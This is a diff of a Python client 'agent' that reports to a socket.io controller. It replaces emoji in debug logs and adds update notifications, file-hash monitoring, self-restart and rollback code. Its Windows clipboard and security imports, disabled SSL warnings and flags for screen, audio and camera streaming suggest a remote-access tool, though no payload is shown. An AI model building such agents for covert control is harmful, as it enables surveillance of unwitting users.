 import warnings
-debug_print("[IMPORTS] ✅ warnings imported")
+debug_print("[IMPORTS] [ OK ] warnings imported")
 
 import uuid
-debug_print("[IMPORTS] ✅ uuid imported")
+debug_print("[IMPORTS] [ OK ] uuid imported")
 
 import subprocess
-debug_print("[IMPORTS] ✅ subprocess imported")
+debug_print("[IMPORTS] [ OK ] subprocess imported")
 
 import threading
-debug_print("[IMPORTS] ✅ threading imported")
+debug_print("[IMPORTS] [ OK ] threading imported")
 
 import random
-debug_print("[IMPORTS] ✅ random imported")
+debug_print("[IMPORTS] [ OK ] random imported")
 
 import base64
-debug_print("[IMPORTS] ✅ base64 imported")
+debug_print("[IMPORTS] [ OK ] base64 imported")
 
 import tempfile
-debug_print("[IMPORTS] ✅ tempfile imported")
+debug_print("[IMPORTS] [ OK ] tempfile imported")
 
 import io
-debug_print("[IMPORTS] ✅ io imported")
+debug_print("[IMPORTS] [ OK ] io imported")
 
 import wave
-debug_print("[IMPORTS] ✅ wave imported")
+debug_print("[IMPORTS] [ OK ] wave imported")
 
 import socket
-debug_print("[IMPORTS] ✅ socket imported")
+debug_print("[IMPORTS] [ OK ] socket imported")
 
 import json
-debug_print("[IMPORTS] ✅ json imported")
+debug_print("[IMPORTS] [ OK ] json imported")
 
 import asyncio
-debug_print("[IMPORTS] ✅ asyncio imported")
+debug_print("[IMPORTS] [ OK ] asyncio imported")
 
 import platform
-debug_print("[IMPORTS] ✅ platform imported")
+debug_print("[IMPORTS] [ OK ] platform imported")
 
 import queue
-debug_print("[IMPORTS] ✅ queue imported")
+debug_print("[IMPORTS] [ OK ] queue imported")
 
 import math
-debug_print("[IMPORTS] ✅ math imported")
+debug_print("[IMPORTS] [ OK ] math imported")
 
 import smtplib
-debug_print("[IMPORTS] ✅ smtplib imported")
+debug_print("[IMPORTS] [ OK ] smtplib imported")
 
 import secrets
-debug_print("[IMPORTS] ✅ secrets imported")
+debug_print("[IMPORTS] [ OK ] secrets imported")
 
 import datetime
-debug_print("[IMPORTS] ✅ datetime imported")
+debug_print("[IMPORTS] [ OK ] datetime imported")
 
 from email.mime.text import MIMEText
-debug_print("[IMPORTS] ✅ email.mime.text imported")
+debug_print("[IMPORTS] [ OK ] email.mime.text imported")
 
 import hashlib
-debug_print("[IMPORTS] ✅ hashlib imported")
+debug_print("[IMPORTS] [ OK ] hashlib imported")
 
 # collections.defaultdict AFTER eventlet patch
 from collections import defaultdict
-debug_print("[IMPORTS] ✅ collections.defaultdict imported")
+debug_print("[IMPORTS] [ OK ] collections.defaultdict imported")
 
 # urllib3 AFTER eventlet patch (this was causing http.client issue)
 try:
     import urllib3
-    debug_print("[IMPORTS] ✅ urllib3 imported")
+    debug_print("[IMPORTS] [ OK ] urllib3 imported")
     URLLIB3_AVAILABLE = True
 except ImportError as e:
-    debug_print(f"[IMPORTS] ⚠️ urllib3 import failed: {e}")
+    debug_print(f"[IMPORTS] [ ! ] urllib3 import failed: {e}")
     URLLIB3_AVAILABLE = False
 
 # HTTP requests (used as fallback)
@@ -554,12 +1208,12 @@ except ImportError:
 if URLLIB3_AVAILABLE:
     try:
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-        debug_print("[IMPORTS] ✅ urllib3 warnings disabled")
+        debug_print("[IMPORTS] [ OK ] urllib3 warnings disabled")
     except Exception as e:
-        debug_print(f"[IMPORTS] ⚠️ urllib3.disable_warnings failed: {e}")
+        debug_print(f"[IMPORTS] [ ! ] urllib3.disable_warnings failed: {e}")
 
 warnings.filterwarnings('ignore', message='Unverified HTTPS request')
-debug_print("[IMPORTS] ✅ SSL warnings suppressed")
+debug_print("[IMPORTS] [ OK ] SSL warnings suppressed")
 
 # Third-party imports with error handling
 try:
@@ -589,48 +1243,48 @@ try:
     
     # Check if we're on Windows first
     if platform.system() != 'Windows':
-        debug_print("[IMPORTS] ❌ Not Windows platform")
+        debug_print("[IMPORTS] [ X ] Not Windows platform")
         WINDOWS_AVAILABLE = False
         PYWIN32_AVAILABLE = False
     else:
-        debug_print("[IMPORTS] ✅ Windows platform detected")
+        debug_print("[IMPORTS] [ OK ] Windows platform detected")
         
         # Import basic Windows modules first (always available on Windows)
         import ctypes
-        debug_print("[IMPORTS] ✅ ctypes imported")
+        debug_print("[IMPORTS] [ OK ] ctypes imported")
         
         from ctypes import wintypes
-        debug_print("[IMPORTS] ✅ wintypes imported")
+        debug_print("[IMPORTS] [ OK ] wintypes imported")
         
         import winreg
-        debug_print("[IMPORTS] ✅ winreg imported")
+        debug_print("[IMPORTS] [ OK ] winreg imported")
         
         # Try to import pywin32 modules (may not be installed)
         try:
             import win32api
-            debug_print("[IMPORTS] ✅ win32api imported")
+            debug_print("[IMPORTS] [ OK ] win32api imported")
             import win32con
-            debug_print("[IMPORTS] ✅ win32con imported")
+            debug_print("[IMPORTS] [ OK ] win32con imported")
             import win32clipboard
-            debug_print("[IMPORTS] ✅ win32clipboard imported")
+            debug_print("[IMPORTS] [ OK ] win32clipboard imported")
             import win32security
-            debug_print("[IMPORTS] ✅ win32security imported")
+            debug_print("[IMPORTS] [ OK ] win32security imported")
             import win32process
-            debug_print("[IMPORTS] ✅ win32process imported")
+            debug_print("[IMPORTS] [ OK ] win32process imported")
             import win32event
-            debug_print("[IMPORTS] ✅ win32event imported")
+            debug_print("[IMPORTS] [ OK ] win32event imported")
             PYWIN32_AVAILABLE = True
-            debug_print("[IMPORTS] ✅ pywin32 FULLY available")
+            debug_print("[IMPORTS] [ OK ] pywin32 FULLY available")
         except ImportError as e:
             PYWIN32_AVAILABLE = False
-            debug_print(f"[IMPORTS] ⚠️ pywin32 not available: {e}")
+            debug_print(f"[IMPORTS] [ ! ] pywin32 not available: {e}")
             debug_print("[IMPORTS] To install: pip install pywin32")
         
         WINDOWS_AVAILABLE = True
-        debug_print("[IMPORTS] ✅ WINDOWS_AVAILABLE = True")
+        debug_print("[IMPORTS] [ OK ] WINDOWS_AVAILABLE = True")
         
 except Exception as e:
-    debug_print(f"[IMPORTS] ❌ Windows import failed: {e}")
+    debug_print(f"[IMPORTS] [ X ] Windows import failed: {e}")
     import traceback
     traceback.print_exc()
     WINDOWS_AVAILABLE = False
@@ -720,14 +1374,14 @@ try:
     )
     
     if test_result.returncode == 0:
-        debug_print("[IMPORTS] ✅ python-socketio package IS installed")
+        debug_print("[IMPORTS] [ OK ] python-socketio package IS installed")
         # Show version
         for line in test_result.stdout.split('\n'):
             if line.startswith('Version:'):
                 debug_print(f"[IMPORTS]    {line.strip()}")
                 break
     else:
-        debug_print("[IMPORTS] ❌ python-socketio package NOT found!")
+        debug_print("[IMPORTS] [ X ] python-socketio package NOT found!")
         debug_print("[IMPORTS] Installing now...")
         subprocess.check_call([sys.executable, "-m", "pip", "install", "python-socketio"])
     
@@ -738,9 +1392,9 @@ try:
     try:
         import socketio
         SOCKETIO_AVAILABLE = True
-        debug_print("[IMPORTS] ✅ socketio imported successfully!")
+        debug_print("[IMPORTS] [ OK ] socketio imported successfully!")
     except ImportError as e1:
-        debug_print(f"[IMPORTS] ❌ Standard import failed: {e1}")
+        debug_print(f"[IMPORTS] [ X ] Standard import failed: {e1}")
         
         # Method 2: Import from client
         try:
@@ -748,9 +1402,9 @@ try:
             import socketio.client
             socketio = socketio.client.Client
             SOCKETIO_AVAILABLE = True
-            debug_print("[IMPORTS] ✅ socketio.Client imported!")
+            debug_print("[IMPORTS] [ OK ] socketio.Client imported!")
         except ImportError as e2:
-            debug_print(f"[IMPORTS] ❌ socketio.Client import failed: {e2}")
+            debug_print(f"[IMPORTS] [ X ] socketio.Client import failed: {e2}")
             
             # Method 3: Check if it's an eventlet patching issue
             debug_print("[IMPORTS] Checking for eventlet conflict...")
@@ -760,10 +1414,10 @@ try:
                 socketio_module = importlib.import_module('socketio')
                 socketio = socketio_module
                 SOCKETIO_AVAILABLE = True
-                debug_print("[IMPORTS] ✅ socketio imported via importlib!")
+                debug_print("[IMPORTS] [ OK ] socketio imported via importlib!")
             except Exception as e3:
                 SOCKETIO_AVAILABLE = False
-                debug_print(f"[IMPORTS] ❌ All import methods failed!")
+                debug_print(f"[IMPORTS] [ X ] All import methods failed!")
                 debug_print(f"[IMPORTS]    Error 1: {e1}")
                 debug_print(f"[IMPORTS]    Error 2: {e2}")
                 debug_print(f"[IMPORTS]    Error 3: {e3}")
@@ -771,7 +1425,7 @@ try:
             
 except Exception as e:
     SOCKETIO_AVAILABLE = False
-    debug_print(f"[IMPORTS] ❌ Unexpected error with socketio: {e}")
+    debug_print(f"[IMPORTS] [ X ] Unexpected error with socketio: {e}")
     import traceback
     traceback.print_exc()
     log_message("python-socketio not available, real-time communication may not work", "warning")
@@ -1232,7 +1886,7 @@ def notify_controller_client_only(agent_id: str):
         if RUN_MODE == 'agent' and SOCKETIO_AVAILABLE and sio is not None:
             # If already connected, emit immediately; otherwise just log
             if hasattr(sio, 'connected') and sio.connected:
-                safe_emit('client_only', {'agent_id': agent_id, 'timestamp': time.time()})  # ✅ SAFE
+                safe_emit('client_only', {'agent_id': agent_id, 'timestamp': time.time()})  # [ OK ] SAFE
                 log_message("Notified controller: client-only mode")
             else:
                 log_message("Will notify controller (client-only) after connect")
@@ -1284,7 +1938,7 @@ def emit_agent_notification(notification_type: str, title: str, message: str,
         }
         
         safe_emit('agent_notification', notification)
-        log_message(f"📢 Notification emitted: {title} ({category})", "info")
+        log_message(f"[ NOTIFICATION ] Notification emitted: {title} ({category})", "info")
         return notification['id']
     except Exception as e:
         log_message(f"Error emitting notification: {e}", "error")
@@ -1301,6 +1955,1223 @@ def emit_system_notification(notification_type: str, title: str, message: str):
 def emit_command_notification(notification_type: str, title: str, message: str):
     """Emit a command notification from agent"""
     return emit_agent_notification(notification_type, title, message, 'command')
+
+def emit_update_notification(notification_type: str, title: str, message: str, update_data: Dict[str, Any] = None):
+    """Emit an update notification from agent with optional update data"""
+    notification_payload = {
+        'type': notification_type,
+        'title': title,
+        'message': message,
+        'timestamp': time.time(),
+        'agent_id': get_or_create_agent_id(),
+        'category': 'update'
+    }
+    
+    if update_data:
+        notification_payload['update_data'] = update_data
+    
+    try:
+        sio.emit('agent_notification', notification_payload)
+        log_message(f"[ NOTIFICATION ] Update notification: {title} - {message}")
+        
+        # Also notify the updater system if available
+        if UPDATER_AVAILABLE:
+            try:
+                handle_update_notification(notification_payload)
+            except Exception as e:
+                log_message(f"[ ! ] Failed to notify updater system: {e}", "warning")
+                
+    except Exception as e:
+        log_message(f"Failed to emit update notification: {e}", "error")
+
+def notify_agent_selected(agent_id: str = None):
+    """Notify when an agent is selected in the controller"""
+    current_agent_id = agent_id or get_or_create_agent_id()
+    emit_update_notification('info', 'Agent Selected', f'Agent {current_agent_id} has been selected', {
+        'event': 'agent_selected',
+        'agent_id': current_agent_id,
+        'timestamp': time.time()
+    })
+
+def notify_new_code_loaded(code_info: Dict[str, Any]):
+    """Notify when new code is loaded to the agent"""
+    emit_update_notification('info', 'New Code Loaded', 'New agent code has been loaded', {
+        'event': 'code_loaded',
+        'code_info': code_info,
+        'timestamp': time.time()
+    })
+    
+    # Log the notification
+    update_logger.log_update_activity('new_code_loaded', {
+        'message': 'New agent code loaded',
+        'code_info': code_info
+    })
+    
+    # Update status
+    update_status_reporter.update_status('new_code_loaded', {
+        'code_info': code_info,
+        'timestamp': time.time()
+    })
+
+def notify_update_available(update_info: Dict[str, Any]):
+    """Notify when updates are available for the agent"""
+    emit_update_notification('warning', 'Update Available', 'New updates are available for this agent', {
+        'event': 'update_available',
+        'update_info': update_info,
+        'timestamp': time.time()
+    })
+    
+    # Log the notification
+    update_logger.log_update_activity('update_available', {
+        'message': 'New updates available for agent',
+        'update_info': update_info
+    })
+    
+    # Update status
+    update_status_reporter.update_status('update_available', {
+        'update_info': update_info,
+        'timestamp': time.time()
+    })
+
+def notify_update_started(update_info: Dict[str, Any]):
+    """Notify when an update process starts"""
+    emit_update_notification('info', 'Update Started', 'Agent update process has started', {
+        'event': 'update_started',
+        'update_info': update_info,
+        'timestamp': time.time()
+    })
+    
+    # Log the notification
+    update_logger.log_update_activity('update_started', {
+        'message': 'Agent update process started',
+        'update_info': update_info
+    })
+    
+    # Update status
+    update_status_reporter.update_status('update_started', {
+        'update_info': update_info,
+        'timestamp': time.time()
+    })
+
+def notify_update_completed(update_info: Dict[str, Any]):
+    """Notify when an update process completes successfully"""
+    emit_update_notification('success', 'Update Completed', 'Agent update completed successfully', {
+        'event': 'update_completed',
+        'update_info': update_info,
+        'timestamp': time.time()
+    })
+    
+    # Log the notification
+    update_logger.log_update_activity('update_completed', {
+        'message': 'Agent update process completed successfully',
+        'update_info': update_info
+    })
+    
+    # Update status
+    update_status_reporter.update_status('update_completed', {
+        'update_info': update_info,
+        'timestamp': time.time()
+    })
+
+def notify_update_failed(error_info: Dict[str, Any]):
+    """Notify when an update process fails"""
+    emit_update_notification('error', 'Update Failed', f'Agent update failed: {error_info.get("error", "Unknown error")}', {
+        'event': 'update_failed',
+        'error_info': error_info,
+        'timestamp': time.time()
+    })
+    
+    # Log the notification
+    update_logger.log_update_activity('update_failed', {
+        'message': f'Agent update process failed: {error_info.get("error", "Unknown error")}',
+        'error_info': error_info
+    }, level='error')
+    
+    # Update status
+    update_status_reporter.update_status('update_failed', {
+        'error_info': error_info,
+        'timestamp': time.time()
+    })
+    
+    # Log the notification
+    update_logger.log_update_activity('update_failed', {
+        'message': f'Agent update process failed: {error_info.get("error", "Unknown error")}',
+        'error_info': error_info
+    }, level='error')
+    
+    # Update status
+    update_status_reporter.update_status('update_failed', {
+        'error_info': error_info,
+        'timestamp': time.time()
+    })
+
+# --- File Monitoring and Update Validation System ---
+class FileIntegrityMonitor:
+    """Monitors file integrity and validates updates"""
+    
+    def __init__(self):
+        self.monitored_files = {}
+        self.file_hashes = {}
+        self.monitoring_active = False
+        self.monitor_thread = None
+        self.monitor_lock = threading.Lock()
+    
+    def start_monitoring(self, file_paths: List[str] = None):
+        """Start monitoring specified files for changes"""
+        if file_paths is None:
+            # Monitor the current script by default
+            file_paths = [__file__]
+        
+        with self.monitor_lock:
+            self.monitored_files = {path: os.path.getmtime(path) if os.path.exists(path) else 0 
+                                  for path in file_paths}
+            self.file_hashes = {path: self._calculate_file_hash(path) 
+                              for path in file_paths if os.path.exists(path)}
+            self.monitoring_active = True
+            
+            if self.monitor_thread is None or not self.monitor_thread.is_alive():
+                self.monitor_thread = threading.Thread(target=self._monitor_files, daemon=True)
+                self.monitor_thread.start()
+                
+        log_message(f"[ MAGNIFIED ] File integrity monitoring started for {len(file_paths)} files")
+        
+        # Log monitoring start
+        update_logger.log_update_activity('file_monitoring_started', {
+            'message': f'File integrity monitoring started for {len(file_paths)} files',
+            'files_monitored': file_paths,
+            'total_files': len(file_paths)
+        })
+        
+        # Update status
+        update_status_reporter.update_status('file_monitoring_started', {
+            'files_monitored': file_paths,
+            'total_files': len(file_paths),
+            'timestamp': time.time()
+        })
+    
+    def stop_monitoring(self):
+        """Stop file monitoring"""
+        with self.monitor_lock:
+            self.monitoring_active = False
+        log_message("[ MAGNIFIED ] File integrity monitoring stopped")
+        
+        # Log monitoring stop
+        update_logger.log_update_activity('file_monitoring_stopped', {
+            'message': 'File integrity monitoring stopped',
+            'files_monitored': list(self.monitored_files.keys())
+        })
+        
+        # Update status
+        update_status_reporter.update_status('file_monitoring_stopped', {
+            'files_monitored': list(self.monitored_files.keys()),
+            'timestamp': time.time()
+        })
+    
+    def _calculate_file_hash(self, file_path: str) -> str:
+        """Calculate SHA256 hash of a file"""
+        try:
+            import hashlib
+            with open(file_path, 'rb') as f:
+                return hashlib.sha256(f.read()).hexdigest()
+        except Exception as e:
+            log_message(f"[ ! ] Failed to calculate hash for {file_path}: {e}", "warning")
+            return ""
+    
+    def _monitor_files(self):
+        """Background thread to monitor file changes"""
+        while self.monitoring_active:
+            try:
+                with self.monitor_lock:
+                    for file_path in list(self.monitored_files.keys()):
+                        if not os.path.exists(file_path):
+                            continue
+                            
+                        current_mtime = os.path.getmtime(file_path)
+                        current_hash = self._calculate_file_hash(file_path)
+                        
+                        if (current_mtime != self.monitored_files.get(file_path, 0) or 
+                            current_hash != self.file_hashes.get(file_path, "")):
+                            
+                            # File has changed
+                            log_message(f"[ FILE ] File changed detected: {file_path}")
+                            self.monitored_files[file_path] = current_mtime
+                            self.file_hashes[file_path] = current_hash
+                            
+                            # Log file change
+                            update_logger.log_update_activity('file_change_detected', {
+                                'message': f'File change detected: {file_path}',
+                                'file_path': file_path,
+                                'new_hash': current_hash,
+                                'new_mtime': current_mtime
+                            })
+                            
+                            # Update status
+                            update_status_reporter.update_status('file_change_detected', {
+                                'file_path': file_path,
+                                'new_hash': current_hash,
+                                'new_mtime': current_mtime,
+                                'timestamp': time.time()
+                            })
+                            
+                            # Notify about the change
+                            if UPDATER_AVAILABLE:
+                                try:
+                                    notify_new_code_loaded({
+                                        'file_path': file_path,
+                                        'new_hash': current_hash,
+                                        'timestamp': current_mtime
+                                    })
+                                except Exception as e:
+                                    log_message(f"[ ! ] Failed to notify about file change: {e}", "warning")
+                
+                time.sleep(5)  # Check every 5 seconds
+                
+            except Exception as e:
+                log_message(f"[ ! ] Error in file monitoring: {e}", "warning")
+                
+                # Log monitoring error
+                update_logger.log_update_activity('file_monitoring_error', {
+                    'message': f'Error in file monitoring: {e}',
+                    'error': str(e)
+                }, level='warning')
+                
+                # Update status
+                update_status_reporter.update_status('file_monitoring_error', {
+                    'error': str(e),
+                    'timestamp': time.time()
+                })
+                time.sleep(10)  # Wait longer on error
+    
+    def validate_update_package(self, update_package: Dict[str, Any]) -> Dict[str, Any]:
+        """Validate an update package before applying"""
+        try:
+            validation_result = {
+                'valid': False,
+                'errors': [],
+                'warnings': [],
+                'package_info': {}
+            }
+            
+            # Check required fields
+            required_fields = ['version', 'files', 'timestamp', 'checksum']
+            for field in required_fields:
+                if field not in update_package:
+                    validation_result['errors'].append(f"Missing required field: {field}")
+            
+            if validation_result['errors']:
+                return validation_result
+            
+            # Validate version format
+            version = update_package.get('version', '')
+            if not version or not isinstance(version, str):
+                validation_result['errors'].append("Invalid version format")
+            
+            # Validate files
+            files = update_package.get('files', {})
+            if not isinstance(files, dict) or not files:
+                validation_result['errors'].append("Invalid or empty files dictionary")
+            
+            # Validate checksum
+            expected_checksum = update_package.get('checksum', '')
+            if not expected_checksum:
+                validation_result['errors'].append("Missing package checksum")
+            
+            # Calculate actual checksum
+            import hashlib
+            import json
+            package_copy = update_package.copy()
+            package_copy.pop('checksum', None)  # Remove checksum from calculation
+            actual_checksum = hashlib.sha256(json.dumps(package_copy, sort_keys=True).encode()).hexdigest()
+            
+            if expected_checksum and actual_checksum != expected_checksum:
+                validation_result['errors'].append("Package checksum mismatch - possible corruption")
+            
+            # Validate file contents
+            for file_path, file_content in files.items():
+                if not isinstance(file_content, str):
+                    validation_result['errors'].append(f"Invalid content for file: {file_path}")
+                elif len(file_content) == 0:
+                    validation_result['warnings'].append(f"Empty content for file: {file_path}")
+            
+            # Set overall validation result
+            validation_result['valid'] = len(validation_result['errors']) == 0
+            validation_result['package_info'] = {
+                'version': version,
+                'file_count': len(files),
+                'timestamp': update_package.get('timestamp', 0),
+                'checksum_valid': expected_checksum == actual_checksum
+            }
+            
+            return validation_result
+            
+        except Exception as e:
+            return {
+                'valid': False,
+                'errors': [f"Validation error: {str(e)}"],
+                'warnings': [],
+                'package_info': {}
+            }
+
+# Global file monitor instance
+file_monitor = FileIntegrityMonitor()
+
+# --- Automatic Restart and Verification System ---
+class RestartManager:
+    """Manages automatic restart and verification of the agent after updates"""
+    
+    def __init__(self):
+        self.restart_scheduled = False
+        self.restart_delay = 5  # seconds
+        self.verification_timeout = 30  # seconds
+        self.restart_lock = threading.Lock()
+        self.verification_data = {}
+    
+    def schedule_restart(self, reason: str = "update", delay: int = None):
+        """Schedule an automatic restart"""
+        with self.restart_lock:
+            if self.restart_scheduled:
+                log_message("[ ! ] Restart already scheduled, ignoring new request")
+                return False
+            
+            self.restart_scheduled = True
+            delay = delay or self.restart_delay
+            
+            log_message(f"[ RESTARTING ] Scheduling restart in {delay} seconds (reason: {reason})")
+            
+            restart_thread = threading.Thread(
+                target=self._perform_restart,
+                args=(reason, delay),
+                daemon=True
+            )
+            restart_thread.start()
+            
+            return True
+    
+    def _perform_restart(self, reason: str, delay: int):
+        """Perform the actual restart sequence"""
+        try:
+            # Log restart initiation
+            update_logger.log_update_activity('restart_scheduled', {
+                'message': f'Agent restart scheduled for {delay} seconds',
+                'reason': reason,
+                'delay': delay
+            })
+            
+            # Update status
+            update_status_reporter.update_status('restart_scheduled', {
+                'reason': reason,
+                'delay': delay,
+                'timestamp': time.time()
+            })
+            
+            # Wait for the specified delay
+            time.sleep(delay)
+            
+            # Store verification data before restart
+            self._store_verification_data(reason)
+            
+            # Log verification data storage
+            update_logger.log_update_activity('verification_data_stored', {
+                'message': 'Verification data stored for post-restart validation',
+                'reason': reason,
+                'verification_data': self.verification_data
+            })
+            
+            # Notify about the restart
+            emit_update_notification('info', 'Agent Restarting', f'Agent restarting due to {reason}', {
+                'event': 'agent_restarting',
+                'reason': reason,
+                'timestamp': time.time()
+            })
+            
+            # Update status
+            update_status_reporter.update_status('agent_restarting', {
+                'reason': reason,
+                'timestamp': time.time()
+            })
+            
+            # Save current state
+            self._save_agent_state()
+            
+            # Log state save
+            update_logger.log_update_activity('agent_state_saved', {
+                'message': 'Agent state saved before restart',
+                'reason': reason
+            })
+            
+            # Perform the restart
+            log_message("[ RESTARTING ] Executing agent restart...")
+            
+            # Get the current script path
+            if getattr(sys, 'frozen', False):
+                # Running as compiled executable
+                script_path = sys.executable
+                restart_command = [script_path]
+            else:
+                # Running as Python script
+                script_path = os.path.abspath(__file__)
+                restart_command = [sys.executable, script_path]
+            
+            # Add any existing command line arguments
+            restart_command.extend(sys.argv[1:])
+            
+            # Execute the restart
+            import subprocess
+            env = os.environ.copy()
+            env["CLIENT_ALLOW_SELF_SPAWN"] = "1"
+            subprocess.Popen(restart_command, env=env)
+            
+            # Exit current process
+            log_message("[ RESTARTING ] Restart command executed, exiting current process...")
+            os._exit(0)
+            
+        except Exception as e:
+            log_message(f"[ X ] Restart failed: {e}", "error")
+            self.restart_scheduled = False
+            
+            # Log restart failure
+            update_logger.log_update_activity('restart_failed', {
+                'message': f'Agent restart failed: {e}',
+                'error': str(e),
+                'reason': reason
+            }, level='error')
+            
+            # Update status
+            update_status_reporter.update_status('restart_failed', {
+                'error': str(e),
+                'reason': reason,
+                'timestamp': time.time()
+            })
+            
+            emit_update_notification('error', 'Restart Failed', f'Agent restart failed: {e}', {
+                'event': 'restart_failed',
+                'error': str(e),
+                'timestamp': time.time()
+            })
+    
+    def _store_verification_data(self, reason: str):
+        """Store data for post-restart verification"""
+        self.verification_data = {
+            'restart_reason': reason,
+            'restart_time': time.time(),
+            'agent_id': get_or_create_agent_id(),
+            'version': VERSION,
+            'pid': os.getpid()
+        }
+        
+        # Save to a temporary file for verification after restart
+        try:
+            import json
+            verification_file = os.path.join(tempfile.gettempdir(), f'agent_restart_{os.getpid()}.json')
+            with open(verification_file, 'w') as f:
+                json.dump(self.verification_data, f)
+            log_message(f"[DATA] Verification data stored in {verification_file}")
+        except Exception as e:
+            log_message(f"[ ! ] Failed to store verification data: {e}", "warning")
+    
+    def _save_agent_state(self):
+        """Save current agent state before restart"""
+        try:
+            state_data = {
+                'timestamp': time.time(),
+                'agent_id': get_or_create_agent_id(),
+                'version': VERSION,
+                'connections': {
+                    'socket_connected': sio.connected if 'sio' in globals() else False,
+                    'webrtc_active': webrtc_connections if 'webrtc_connections' in globals() else {}
+                },
+                'active_streams': {
+                    'screen': screen_streaming_active if 'screen_streaming_active' in globals() else False,
+                    'audio': audio_streaming_active if 'audio_streaming_active' in globals() else False,
+                    'camera': camera_streaming_active if 'camera_streaming_active' in globals() else False
+                }
+            }
+            
+            state_file = os.path.join(tempfile.gettempdir(), f'agent_state_{get_or_create_agent_id()}.json')
+            import json
+            with open(state_file, 'w') as f:
+                json.dump(state_data, f)
+            
+            log_message(f"[SAVE] Agent state saved to {state_file}")
+            
+        except Exception as e:
+            log_message(f"[ ! ] Failed to save agent state: {e}", "warning")
+    
+    def verify_restart_success(self) -> Dict[str, Any]:
+        """Verify that the restart was successful"""
+        try:
+            # Look for verification files from previous restarts
+            import glob
+            verification_pattern = os.path.join(tempfile.gettempdir(), 'agent_restart_*.json')
+            verification_files = glob.glob(verification_pattern)
+            
+            if not verification_files:
+                return {
+                    'success': True,
+                    'message': 'No previous restart verification data found',
+                    'is_fresh_start': True
+                }
+            
+            # Use the most recent verification file
+            latest_file = max(verification_files, key=os.path.getmtime)
+            
+            with open(latest_file, 'r') as f:
+                verification_data = json.load(f)
+            
+            # Check if restart was recent (within verification timeout)
+            restart_age = time.time() - verification_data.get('restart_time', 0)
+            if restart_age > self.verification_timeout:
+                return {
+                    'success': False,
+                    'message': 'Previous restart verification data is too old',
+                    'restart_age': restart_age
+                }
+            
+            # Verify version consistency
+            if verification_data.get('version') != VERSION:
+                return {
+                    'success': False,
+                    'message': 'Version mismatch after restart',
+                    'expected_version': verification_data.get('version'),
+                    'actual_version': VERSION
+                }
+            
+            # Clean up verification file
+            try:
+                os.remove(latest_file)
+            except Exception:
+                pass
+            
+            return {
+                'success': True,
+                'message': 'Restart verification successful',
+                'restart_reason': verification_data.get('restart_reason'),
+                'restart_time': verification_data.get('restart_time'),
+                'agent_id': verification_data.get('agent_id')
+            }
+            
+        except Exception as e:
+            return {
+                'success': False,
+                'message': f'Verification error: {str(e)}'
+            }
+
+# Global restart manager instance
+restart_manager = RestartManager()
+
+# --- Rollback and State Preservation System ---
+class RollbackManager:
+    """Manages rollback capabilities and state preservation during updates"""
+    
+    def __init__(self):
+        self.backup_dir = os.path.join(tempfile.gettempdir(), 'agent_backups')
+        self.max_backups = 5
+        self.backup_lock = threading.Lock()
+        self.state_preservation = StatePreserver()
+        
+        # Ensure backup directory exists
+        try:
+            os.makedirs(self.backup_dir, exist_ok=True)
+        except Exception as e:
+            log_message(f"[ ! ] Failed to create backup directory: {e}", "warning")
+    
+    def update_agent_id(self, agent_id: str):
+        """Update the agent ID for state preservation"""
+        self.state_preservation.update_agent_id(agent_id)
+    
+    def create_backup(self, files_to_backup: List[str] = None) -> Dict[str, Any]:
+        """Create a backup of current agent files"""
+        with self.backup_lock:
+            try:
+                backup_id = f"backup_{int(time.time())}_{os.getpid()}"
+                backup_path = os.path.join(self.backup_dir, backup_id)
+                
+                # Log backup creation start
+                update_logger.log_update_activity('backup_creation_started', {
+                    'message': f'Starting backup creation: {backup_id}',
+                    'backup_id': backup_id,
+                    'files_to_backup': files_to_backup or [__file__]
+                })
+                
+                # Update status
+                update_status_reporter.update_status('backup_creation_started', {
+                    'backup_id': backup_id,
+                    'timestamp': time.time()
+                })
+                
+                # Default files to backup
+                if files_to_backup is None:
+                    files_to_backup = [__file__]
+                
+                # Create backup directory
+                os.makedirs(backup_path, exist_ok=True)
+                
+                backup_info = {
+                    'backup_id': backup_id,
+                    'timestamp': time.time(),
+                    'agent_id': get_or_create_agent_id(),
+                    'version': VERSION,
+                    'files': {},
+                    'state': self.state_preservation.capture_state()
+                }
+                
+                # Backup each file
+                for file_path in files_to_backup:
+                    if os.path.exists(file_path):
+                        try:
+                            # Calculate relative path for backup
+                            rel_path = os.path.basename(file_path)
+                            backup_file_path = os.path.join(backup_path, rel_path)
+                            
+                            # Copy file
+                            import shutil
+                            shutil.copy2(file_path, backup_file_path)
+                            
+                            # Store file info
+                            backup_info['files'][rel_path] = {
+                                'original_path': file_path,
+                                'backup_path': backup_file_path,
+                                'size': os.path.getsize(file_path),
+                                'mtime': os.path.getmtime(file_path),
+                                'hash': self._calculate_file_hash(file_path)
+                            }
+                            
+                            log_message(f"[SAVE] Backed up: {file_path} -> {backup_file_path}")
+                            
+                        except Exception as e:
+                            log_message(f"[ ! ] Failed to backup {file_path}: {e}", "warning")
+                
+                # Save backup metadata
+                metadata_file = os.path.join(backup_path, 'backup_metadata.json')
+                import json
+                with open(metadata_file, 'w') as f:
+                    json.dump(backup_info, f, indent=2)
+                
+                log_message(f"[ OK ] Backup created successfully: {backup_id}")
+                
+                # Log backup completion
+                update_logger.log_update_activity('backup_created', {
+                    'message': f'Backup created successfully: {backup_id}',
+                    'backup_id': backup_id,
+                    'files_backed_up': len(backup_info['files']),
+                    'backup_path': backup_path
+                })
+                
+                # Update status
+                update_status_reporter.update_status('backup_created', {
+                    'backup_id': backup_id,
+                    'files_backed_up': len(backup_info['files']),
+                    'timestamp': time.time()
+                })
+                
+                # Cleanup old backups
+                self._cleanup_old_backups()
+                
+                return {
+                    'success': True,
+                    'backup_id': backup_id,
+                    'backup_path': backup_path,
+                    'files_backed_up': len(backup_info['files'])
+                }
+                
+            except Exception as e:
+                log_message(f"[ X ] Backup creation failed: {e}", "error")
+                
+                # Log backup creation failure
+                update_logger.log_update_activity('backup_creation_failed', {
+                    'message': f'Backup creation failed: {e}',
+                    'error': str(e)
+                }, level='error')
+                
+                # Update status
+                update_status_reporter.update_status('backup_creation_failed', {
+                    'error': str(e),
+                    'timestamp': time.time()
+                })
+                
+                return {
+                    'success': False,
+                    'error': str(e)
+                }
+    
+    def rollback_to_backup(self, backup_id: str) -> Dict[str, Any]:
+        """Rollback to a specific backup"""
+        with self.backup_lock:
+            try:
+                backup_path = os.path.join(self.backup_dir, backup_id)
+                metadata_file = os.path.join(backup_path, 'backup_metadata.json')
+                
+                if not os.path.exists(metadata_file):
+                    # Log rollback failure
+                    update_logger.log_update_activity('rollback_failed', {
+                        'message': f'Backup metadata not found for rollback: {backup_id}',
+                        'backup_id': backup_id,
+                        'error': 'Backup metadata not found'
